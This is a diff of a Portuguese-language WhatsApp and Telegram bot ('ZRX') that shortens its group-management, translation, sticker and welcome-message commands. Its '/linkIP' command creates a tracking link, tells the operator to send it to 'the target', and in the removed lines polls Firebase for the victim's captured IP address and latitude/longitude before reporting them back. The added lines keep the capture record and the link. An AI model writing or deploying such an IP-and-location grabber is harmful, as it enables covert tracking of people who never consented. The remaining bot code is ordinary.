-                    await waSock.sendMessage(remoteJid, { text: '🔒 Grupo fechado!' });
-                } catch (err) {}
+                await waSock.groupSettingUpdate(remoteJid, 'announcement');
             }
             else if (texto.trim() === '/abrir') {
                 if (!remoteJid.endsWith('@g.us')) return;
-                try {
-                    await waSock.groupSettingUpdate(remoteJid, 'not_announcement');
-                    await waSock.sendMessage(remoteJid, { text: '🔓 Grupo aberto!' });
-                } catch (err) {}
+                await waSock.groupSettingUpdate(remoteJid, 'not_announcement');
             }
             else if (texto.trim() === '/infogrupo') {
                 if (!remoteJid.endsWith('@g.us')) return;
-                try {
-                    const meta = await waSock.groupMetadata(remoteJid);
-                    const criador = meta.owner ? `@${meta.owner.split('@')[0]}` : 'Desconhecido';
-                    const infoMsg = 
-                        `📊 *INFORMAÇÕES DO GRUPO* 📊\n\n` +
-                        `• *Nome:* ${meta.subject}\n` +
-                        `• *Criador:* ${criador}\n` +
-                        `• *Total de Membros:* ${meta.participants.length}\n` +
-                        `• *Descrição:* ${meta.desc || 'Sem descrição'}`;
-                    
-                    await waSock.sendMessage(remoteJid, { text: infoMsg, mentions: meta.owner ? [meta.owner] : [] });
-                } catch (err) {}
+                const meta = await waSock.groupMetadata(remoteJid);
+                await waSock.sendMessage(remoteJid, { text: `📊 *Grupo:* ${meta.subject}\n👥 *Membros:* ${meta.participants.length}` });
             }
             else if (texto.startsWith('/mudar-nome ')) {
                 if (!remoteJid.endsWith('@g.us')) return;
-                const novoNome = texto.replace('/mudar-nome', '').trim();
-                try {
-                    await waSock.groupUpdateSubject(remoteJid, novoNome);
-                    await waSock.sendMessage(remoteJid, { text: `✅ Nome alterado para: *${novoNome}*` });
-                } catch (err) {}
+                await waSock.groupUpdateSubject(remoteJid, texto.replace('/mudar-nome', '').trim());
             }
             else if (texto.startsWith('/mudar-desc ')) {
                 if (!remoteJid.endsWith('@g.us')) return;
-                const novaDesc = texto.replace('/mudar-desc', '').trim();
-                try {
-                    await waSock.groupUpdateDescription(remoteJid, novaDesc);
-                    await waSock.sendMessage(remoteJid, { text: `✅ Descrição alterada com sucesso!` });
-                } catch (err) {}
+                await waSock.groupUpdateDescription(remoteJid, texto.replace('/mudar-desc', '').trim());
             }
             else if (texto.startsWith('/divulgar ')) {
-                const conteudoDivulgacao = texto.replace('/divulgar', '').trim();
-                const mensagemFormatada = `📢 *DIVULGAÇÃO OFICIAL* 📢\n\n${conteudoDivulgacao}\n\n_Enviado via Bot ZRX_`;
-
-                try {
-                    if (msg.message.imageMessage) {
-                        const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
-                        await waSock.sendMessage(remoteJid, { image: buffer, caption: mensagemFormatada });
-                    } else {
-                        await waSock.sendMessage(remoteJid, { text: mensagemFormatada });
-                    }
-                } catch (e) {
-                    await waSock.sendMessage(remoteJid, { text: mensagemFormatada });
+                const conteudo = texto.replace('/divulgar', '').trim();
+                if (msg.message.imageMessage) {
+                    const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
+                    await waSock.sendMessage(remoteJid, { image: buffer, caption: conteudo });
+                } else {
+                    await waSock.sendMessage(remoteJid, { text: conteudo });
                 }
             }
             else if (texto.trim() === '/nivel') {
                 const user = dadosUsuarios[sender] || { xp: 0, level: 1 };
-                await waSock.sendMessage(remoteJid, { text: `⭐ *SEU PERFIL / NÍVEL*\n\n• *Nível:* ${user.level}\n• *XP Atual:* ${user.xp}/${user.level * 100}` });
+                await waSock.sendMessage(remoteJid, { text: `⭐ *Nível:* ${user.level} | *XP:* ${user.xp}/${user.level * 100}` });
             }
             else if (texto.startsWith('/setwelcome')) {
-                if (!remoteJid.endsWith('@g.us')) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Use este comando em um grupo!' });
-                    return;
-                }
-                const msgWelcome = texto.replace('/setwelcome', '').trim();
-                let fotoBuffer = null;
-
-                if (msg.message.imageMessage) {
-                    fotoBuffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
-                }
-
+                if (!remoteJid.endsWith('@g.us')) return;
+                let fotoBuffer = msg.message.imageMessage ? await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) }) : null;
                 configuracoesGrupos[remoteJid] = {
-                    bemVindoTexto: msgWelcome || 'Olá @user, seja bem-vindo(a)!',
+                    bemVindoTexto: texto.replace('/setwelcome', '').trim() || 'Seja bem-vindo(a) @user!',
                     bemVindoFoto: fotoBuffer
                 };
-
-                await waSock.sendMessage(remoteJid, { text: '✅ Mensagem de boas-vindas configurada com sucesso para este grupo!' });
+                await waSock.sendMessage(remoteJid, { text: '✅ Boas-vindas configuradas!' });
             }
             else if (texto.startsWith('/traduzir')) {
                 const idioma = texto.replace('/traduzir', '').trim() || 'pt';
                 const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
-                const textoParaTraduzir = quoted?.conversation || quoted?.extendedTextMessage?.text;
-
-                if (!textoParaTraduzir) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Responda a uma mensagem de texto usando `/traduzir <idioma>`' });
-                    return;
-                }
-
-                const urlTraducao = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${idioma}&dt=t&q=${encodeURIComponent(textoParaTraduzir)}`;
-                const respostaTraducao = await consultarAPI(urlTraducao);
-
-                try {
-                    const textoTraduzido = respostaTraducao[0][0][0];
-                    await waSock.sendMessage(remoteJid, { text: `🌐 *TRADUÇÃO (${idioma.toUpperCase()}):*\n\n${textoTraduzido}` });
-                } catch (e) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao traduzir.' });
+                const txt = quoted?.conversation || quoted?.extendedTextMessage?.text;
+                if (txt) {
+                    const res = await consultarAPI(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${idioma}&dt=t&q=${encodeURIComponent(txt)}`);
+                    await waSock.sendMessage(remoteJid, { text: `🌐 ${res[0][0][0]}` });
                 }
             }
             else if (texto.trim() === '/s' || texto.trim() === '/sticker') {
                 const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
-                const isImage = msg.message.imageMessage || quoted?.imageMessage;
-
-                if (!isImage) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Envie ou responda a uma imagem com `/s` para transformar em figurinha!' });
-                    return;
-                }
-
-                try {
-                    const targetMsg = msg.message.imageMessage ? msg : { key: { remoteJid, id: msg.message.extendedTextMessage.contextInfo.stanzaId }, message: quoted };
-                    const buffer = await downloadMediaMessage(targetMsg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
+                if (msg.message.imageMessage || quoted?.imageMessage) {
+                    const target = msg.message.imageMessage ? msg : { key: { remoteJid, id: msg.message.extendedTextMessage.contextInfo.stanzaId }, message: quoted };
+                    const buffer = await downloadMediaMessage(target, 'buffer', {}, { logger: pino({ level: 'silent' }) });
                     await waSock.sendMessage(remoteJid, { sticker: buffer });
-                } catch (err) {}
+                }
             }
             else if (texto.trim() === '/linkIP') {
                 const idUnico = 'zrx_' + Math.random().toString(36).substring(2, 8);
-                const linkGerado = `https://wv0304362-bot.github.io/linkApi1-/?id=${idUnico}`;
-
-                await salvarFirebase(`capturas/${idUnico}`, { status: 'aguardando', criado_em: new Date().toISOString() }).catch(() => {});
-
-                await waSock.sendMessage(remoteJid, { 
-                    text: `🔗 *LINK GERADO COM SUCESSO*\n\nEnvie o link para o alvo:\n${linkGerado}` 
-                });
-
-                const intervaloVerificacao = setInterval(async () => {
-                    try {
-                        const dadosCapturados = await buscarFirebase(`capturas/${idUnico}`);
-                        if (dadosCapturados && dadosCapturados.ip && dadosCapturados.ip !== 'Desconhecido' && dadosCapturados.timestamp) {
-                            clearInterval(intervaloVerificacao);
-
-                            const lat = dadosCapturados.location?.lat || 'Negado';
-                            const lon = dadosCapturados.location?.lon || 'Negado';
-                            const ipCapturado = dadosCapturados.ip || 'Desconhecido';
-
-                            const alertaMsg = 
-                                `🚨 *DADOS CAPTURADOS!* 🚨\n\n` +
-                                `🌐 *IP:* ${ipCapturado}\n` +
-                                `📍 *Latitude:* ${lat}\n` +
-                                `📍 *Longitude:* ${lon}\n` +
-                                `🕒 *Horário:* ${dadosCapturados.timestamp}`;
-
-                            await waSock.sendMessage(remoteJid, { text: alertaMsg });
-                        }
-                    } catch (e) {}
-                }, 3000);
+                await salvarFirebase(`capturas/${idUnico}`, { status: 'aguardando' }).catch(() => {});
+                await waSock.sendMessage(remoteJid, { text: `🔗 https://wv0304362-bot.github.io/linkApi1-/?id=${idUnico}` });
             }
         } catch (erroMensagem) {
             console.error("Erro asset:", erroMensagem);
@@ -868,14 +635,10 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
         try {
             const codigo = await waSock.requestPairingCode(numeroTelefone);
             if (chatId) {
-                const mensagemLayout = `✅ **Conectado com sucesso**\n\nO código\n\`${codigo}\``;
-                const opts = {
+                bot.sendMessage(chatId, `✅ Código de pareamento:\n\`${codigo}\``, {
                     parse_mode: 'Markdown',
-                    reply_markup: {
-                        inline_keyboard: [[{ text: '📋 Copiar Código', callback_data: `copiar_${codigo}` }]]
-                    }
-                };
-                bot.sendMessage(chatId, mensagemLayout, opts);
+                    reply_markup: { inline_keyboard: [[{ text: '📋 Copiar', callback_data: `copiar_${codigo}` }]] }
+                });
             }
         } catch (error) {}
     }
@@ -885,83 +648,43 @@ function remoteJidCheck(msg) {
     return msg.key.remoteJid;
 }
 
-// Comando /foto no Telegram para definir a imagem do menu de ambas as plataformas
 bot.on('photo', async (msg) => {
     const chatId = msg.chat.id;
-    const caption = msg.caption || '';
-
-    if (caption.toLowerCase().startsWith('/foto') || msg.reply_to_message) {
+    if (msg.caption?.toLowerCase().includes('/foto') || msg.reply_to_message) {
         try {
-            bot.sendMessage(chatId, "🔄 Salvando nova foto para o menu do bot...");
-
-            const fotoId = msg.photo[msg.photo.length - 1].file_id;
-            const fileLink = await bot.getFileLink(fotoId);
-
-            const caminhoMenu = path.join(__dirname, 'menu.jpg');
-            const fileStream = fs.createWriteStream(caminhoMenu);
-
-            https.get(fileLink, (response) => {
-                response.pipe(fileStream);
-                fileStream.on('finish', () => {
-                    fileStream.close();
-                    bot.sendMessage(chatId, "✅ Foto do menu atualizada com sucesso!");
-                });
+            const fileLink = await bot.getFileLink(msg.photo[msg.photo.length - 1].file_id);
+            const fileStream = fs.createWriteStream(path.join(__dirname, 'menu.jpg'));
+            https.get(fileLink, (res) => {
+                res.pipe(fileStream);
+                fileStream.on('finish', () => bot.sendMessage(chatId, "✅ Foto do menu atualizada!"));
             });
         } catch (err) {}
     }
 });
 
-bot.on('callback_query', async (callbackQuery) => {
-    const data = callbackQuery.data;
-    if (data.startsWith('copiar_')) {
-        const codigo = data.replace('copiar_', '');
-        await bot.answerCallbackQuery(callbackQuery.id, {
-            text: `Código ${codigo} copiado!`,
-            show_alert: true
-        });
+bot.on('callback_query', async (query) => {
+    if (query.data.startsWith('copiar_')) {
+        await bot.answerCallbackQuery(query.id, { text: `Copiado!`, show_alert: true });
     }
 });
 
 bot.onText(/\/limpar|\/desconectar/, async (msg) => {
-    const chatId = msg.chat.id;
-    const pastaSessao = path.join(__dirname, 'sessao_teste');
-
-    try {
-        if (waSock) {
-            await waSock.logout().catch(() => {});
-            waSock = null;
-        }
-        if (fs.existsSync(pastaSessao)) {
-            fs.rmSync(pastaSessao, { recursive: true, force: true });
-        }
-        reconectando = false;
-        jaNotificouConectado = false;
-        bot.sendMessage(chatId, "🧹 Sessão limpa com sucesso!", { parse_mode: 'Markdown' });
-    } catch (error) {}
+    if (waSock) { await waSock.logout().catch(() => {}); waSock = null; }
+    if (fs.existsSync(path.join(__dirname, 'sessao_teste'))) fs.rmSync(path.join(__dirname, 'sessao_teste'), { recursive: true, force: true });
+    reconectando = false;
+    jaNotificouConectado = false;
+    bot.sendMessage(msg.chat.id, "🧹 Sessão limpa com sucesso!");
 });
 
 bot.onText(/\/conectar (.+)/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const numeroTelefone = match[1].replace(/\D/g, '');
-    bot.sendMessage(chatId, `🔄 Solicitando código para o número: \`${numeroTelefone}\`...`, { parse_mode: 'Markdown' });
-    await iniciarWhatsApp(chatId, numeroTelefone);
+    await iniciarWhatsApp(msg.chat.id, match[1].replace(/\D/g, ''));
 });
 
 bot.onText(/\/start/, (msg) => {
-    const chatId = msg.chat.id;
-    const startTexto = 
-        `🤖 *ZRX CONTROL SYSTEM* \n\n` +
-        `• Para conectar o WhatsApp: \`/conectar SEU_NUMERO\`\n` +
-        `• Para atualizar a foto do menu: *Envie uma foto com a legenda \`/foto\`*\n` +
-        `• Para limpar sessão: \`/limpar\``;
-
+    const txt = `🤖 *ZRX CONTROL SYSTEM*\n\n• Para conectar: \`/conectar SEU_NUMERO\`\n• Para alterar foto do menu: Envie foto com legenda \`/foto\``;
     const caminhoFoto = path.join(__dirname, 'menu.jpg');
-
-    if (fs.existsSync(caminhoFoto)) {
-        bot.sendPhoto(chatId, caminhoFoto, { caption: startTexto, parse_mode: 'Markdown' });
-    } else {
-        bot.sendMessage(chatId, startTexto, { parse_mode: 'Markdown' });
-    }
+    if (fs.existsSync(caminhoFoto)) bot.sendPhoto(msg.chat.id, caminhoFoto, { caption: txt, parse_mode: 'Markdown' });
+    else bot.sendMessage(msg.chat.id, txt, { parse_mode: 'Markdown' });
 });
 
 console.log("Bot do Telegram iniciado e escutando comandos!");
